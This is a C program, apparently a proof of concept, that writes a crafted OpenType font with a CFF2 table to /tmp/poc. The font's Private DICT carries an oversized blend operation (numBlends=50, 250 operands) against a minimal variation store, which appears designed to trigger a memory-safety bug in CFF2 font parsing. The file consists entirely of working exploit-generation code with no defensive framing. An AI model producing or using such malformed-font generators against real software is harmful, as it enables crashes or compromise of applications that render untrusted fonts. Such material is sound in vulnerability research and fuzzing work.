#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

static void w16(FILE *f, uint16_t v) {
    fputc((v>>8)&0xFF, f); fputc(v&0xFF, f);
}
static void w32(FILE *f, uint32_t v) {
    fputc((v>>24)&0xFF, f); fputc((v>>16)&0xFF, f);
    fputc((v>>8)&0xFF, f); fputc(v&0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    /* SFNT header: OTTO */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);
    w16(f, 8); w16(f, 128); w16(f, 3); w16(f, 0);

    long dir_start = ftell(f);
    int i;
    for (i = 0; i < 8; i++) {
        fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
        w32(f, 0); w32(f, 0); w32(f, 0);
    }

    long table_offsets[8];
    long table_lengths[8];
    const char *tags[8] = {"head", "hhea", "maxp", "OS/2", "hmtx", "name", "cmap", "CFF2"};

    /* 1. head table (54 bytes) */
    table_offsets[0] = ftell(f);
    w32(f, 0x00010000); w32(f, 0x00010000); w32(f, 0); w32(f, 0x5F0F3CF5);
    w16(f, 0); w16(f, 1000); w32(f, 0); w32(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 2); w16(f, 0); w16(f, 0); w16(f, 0);
    table_lengths[0] = ftell(f) - table_offsets[0];

    /* 2. hhea table (36 bytes) */
    table_offsets[1] = ftell(f);
    w32(f, 0x00010000); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 1);
    table_lengths[1] = ftell(f) - table_offsets[1];

    /* 3. maxp table (6 bytes) */
    table_offsets[2] = ftell(f);
    w32(f, 0x00005000); w16(f, 1);
    table_lengths[2] = ftell(f) - table_offsets[2];

    /* 4. OS/2 table (78 bytes) */
    table_offsets[3] = ftell(f);
    w16(f, 4); w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    fputc(0, f); fputc(0, f);
    w32(f, 0); w32(f, 0); w32(f, 0); w32(f, 0);
    fputc('N', f); fputc('O', f); fputc('N', f); fputc('E', f);
    w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0);
    w32(f, 0); w32(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    table_lengths[3] = ftell(f) - table_offsets[3];

    /* 5. hmtx table (4 bytes) */
    table_offsets[4] = ftell(f);
    w16(f, 0); w16(f, 0);
    table_lengths[4] = ftell(f) - table_offsets[4];

    /* 6. name table (6 bytes) */
    table_offsets[5] = ftell(f);
    w16(f, 0); w16(f, 0); w16(f, 0);
    table_lengths[5] = ftell(f) - table_offsets[5];

    /* 7. cmap table (format 4 with 1 segment) */
    table_offsets[6] = ftell(f);
    w16(f, 0); w16(f, 1); w16(f, 3); w16(f, 1);
    w32(f, 12);
    w16(f, 4); w16(f, 24); w16(f, 0);
    w16(f, 4); w16(f, 2); w16(f, 1); w16(f, 0);
    w16(f, 0xFFFF); w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    table_lengths[6] = ftell(f) - table_offsets[6];

    /* 8. CFF2 table */
    table_offsets[7] = ftell(f);
    long cff_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f); fputc(0x00, f); fputc(0x05, f);
    long topdict_len_pos = ftell(f);
    w16(f, 0);

    /* Top DICT */
    long td_start = ftell(f);
    fputc(0x1C, f); w16(f, 0); fputc(0x18, f); /* vstore */
    fputc(0x1C, f); w16(f, 0); fputc(0x11, f); /* FDArray */
    fputc(0x1C, f); w16(f, 0); fputc(0x12, f); /* CharStrings */
    fputc(0x0D, f);
    long td_end = ftell(f);
    long td_len = td_end - td_start;
    fseek(f, topdict_len_pos, SEEK_SET);
    w16(f, (uint16_t)td_len);
    fseek(f, td_end, SEEK_SET);

    /* Global Subr INDEX (empty) */
    w32(f, 0);

    /* VariationStore */
    long vstore_start = ftell(f);
    w16(f, 1);
    long vrl_off_pos = ftell(f); w32(f, 0);
    w16(f, 1);
    long ivd_off_pos = ftell(f); w32(f, 0);
    long vrl_start = ftell(f);
    w16(f, 1); w16(f, 1);
    w16(f, 0); w16(f, 0x4000); w16(f, 0x7FFF);
    long ivd_start = ftell(f);
    w16(f, 1); w16(f, 0); w16(f, 1); w16(f, 0); w16(f, 0);
    fseek(f, vrl_off_pos, SEEK_SET); w32(f, (uint32_t)(vrl_start - vstore_start));
    fseek(f, ivd_off_pos, SEEK_SET); w32(f, (uint32_t)(ivd_start - vstore_start));
    fseek(f, ivd_start + 10, SEEK_SET);

    /* FDArray INDEX */
    long fdarr_start = ftell(f);
    w32(f, 1); fputc(0x01, f); fputc(0x01, f);
    long fdarr_off1 = ftell(f); fputc(0, f);
    long fd_start = ftell(f);
    fputc(0x1C, f); w16(f, 0); /* priv size */
    fputc(0x1C, f); w16(f, 0); /* priv offset */
    fputc(0x12, f); /* Private operator */
    fputc(0x0D, f);
    long fd_len = ftell(f) - fd_start;
    fseek(f, fdarr_off1, SEEK_SET); fputc((uint8_t)(fd_len + 1), f);
    fseek(f, fd_start + fd_len, SEEK_SET);

    /* Private DICT */
    long priv_start = ftell(f);
    fputc(0x1C, f); w16(f, 0); fputc(0x16, f); /* vsindex */
    /* First blend: numBlends=1 */
    int j;
    for (j = 0; j < 5 * 1; j++) {
        fputc(0x1C, f); w16(f, 0);
    }
    fputc(0x1C, f); w16(f, 1);
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator (CFF2: 0x0C 0x1A) */
    /* Second blend: numBlends=50 */
    for (j = 0; j < 5 * 50; j++) {
        fputc(0x1C, f); w16(f, 0);
    }
    fputc(0x1C, f); w16(f, 50);
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator (CFF2: 0x0C 0x1A) */
    fputc(0x0D, f);
    long priv_len = ftell(f) - priv_start;
    long priv_off = priv_start - cff_start;

    /* Patch Font DICT */
    fseek(f, fd_start + 1, SEEK_SET); w16(f, (uint16_t)priv_len);
    fseek(f, fd_start + 4, SEEK_SET); w16(f, (uint16_t)priv_off);

    /* Patch Top DICT offsets */
    long vstore_off = vstore_start - cff_start;
    long fdarr_off = fdarr_start - cff_start;
    long cs_start = ftell(f); w32(f, 0);
    long cs_off = cs_start - cff_start;
    fseek(f, td_start + 4, SEEK_SET); w16(f, (uint16_t)vstore_off);
    fseek(f, td_start + 7, SEEK_SET); w16(f, (uint16_t)fdarr_off);
    fseek(f, td_start + 10, SEEK_SET); w16(f, (uint16_t)cs_off);

    table_lengths[7] = ftell(f) - table_offsets[7];

    /* Patch table directory */
    fseek(f, dir_start, SEEK_SET);
    for (i = 0; i < 8; i++) {
        fputc(tags[i][0], f); fputc(tags[i][1], f); fputc(tags[i][2], f); fputc(tags[i][3], f);
        w32(f, 0);
        w32(f, (uint32_t)table_offsets[i]);
        w32(f, (uint32_t)table_lengths[i]);
    }

    fclose(f);
    return 0;
}